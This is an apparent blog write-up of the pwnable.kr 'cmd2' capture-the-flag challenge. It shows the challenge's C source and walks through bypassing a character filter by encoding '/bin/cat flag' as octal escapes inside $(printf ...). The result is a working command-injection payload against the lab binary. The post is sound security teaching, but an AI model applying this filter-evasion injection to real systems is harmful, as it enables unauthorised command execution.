---
layout: post
title: "Pwnable.kr writeup — cmd2"
date: 2017-10-16 00:09:11 +0000
categories: blog
---

### Pwnable.kr writeup — cmd2

This one is a very interesting challenge. Look at its source code:

```
int filter(char* cmd){ int r=0; r += strstr(cmd, "=")!=0; r += strstr(cmd, "PATH")!=0; r += strstr(cmd, "export")!=0; r += strstr(cmd, "/")!=0; r += strstr(cmd, "`")!=0; r += strstr(cmd, "flag")!=0; return r;}
```

```
extern char** environ;void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));}
```

```
int main(int argc, char* argv[], char** envp){ delete_env(); putenv("PATH=/no_command_execution_until_you_become_a_hacker"); if(filter(argv[1])) return 0; printf("%s\n", argv[1]); system( argv[1] ); return 0;}
```

We notice that:

```
$PATH
```

```
$SHELL
```

```
$PWD
```

There are not many choices here, think about it: which command does not either rely on $PATH or need a path at all? Shell builtin commands!!

```
$PATH
```

With bash, you can easily find all the builtin commands by help . Looking at them, which ones could we pick?

```
help
```

pwd? But we still have to use a slash for concatenation.

```
pwd
```

source? Good!! We could source our own shell script to setup the original $PATH, right? But the problem is that “/bin/sh” is not bash but dash, dash does not have source but has . which still relies on $PATH or a path you tell it… Sigh, we can’t use it either.

```
source
```

```
$PATH
```

```
bash
```

```
dash
```

```
dash
```

```
source
```

```
.
```

```
$PATH
```

Looks like we have to pass the slash filter. Look at the source code again, it checks for /, so maybe we can pass something else for /? How about its ASCII value? What about using echo and printf?

```
/
```

```
/
```

```
echo
```

```
printf
```

It is easy to rule out echo because the echo from dash does not support backslash characters. We can only use printf although it only supports octal numbers:

```
echo
```

```
echo
```

```
printf
```

```
\num    Write an 8-bit character whose ASCII value is the        1-, 2-, or 3-digit octal number num.
```

This is enough. Now let’s encode the command string we want to execute into octal numbers, with python:

```
$ ~> python   Python 2.7.13 (default, Mar 22 2017, 12:31:17) [GCC] on linux2Type "help", "copyright", "credits" or "license" for more information.>>> s = "/bin/cat flag">>> [str(oct(ord(c))) for c in s]['057', '0142', '0151', '0156', '057', '0143', '0141', '0164', '040', '0146', '0154', '0141', '0147']>>> [str(oct(ord(c))).lstrip('0') for c in s]['57', '142', '151', '156', '57', '143', '141', '164', '40', '146', '154', '141', '147']>>> [(chr(92) + str(oct(ord(c))).lstrip('0')) for c in s]['\\57', '\\142', '\\151', '\\156', '\\57', '\\143', '\\141', '\\164', '\\40', '\\146', '\\154', '\\141', '\\147']>>> "".join([(chr(92) + str(oct(ord(c))).lstrip('0')) for c in s])'\\57\\142\\151\\156\\57\\143\\141\\164\\40\\146\\154\\141\\147'>>> print "".join([(chr(92) + str(oct(ord(c))).lstrip('0')) for c in s])\57\142\151\156\57\143\141\164\40\146\154\141\147
```

Now pass this octal-number string to cmd2 with carefully taking care of double and single quotes:

```
$ ./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\146\154\141\147")'
```

Now you can see the flag!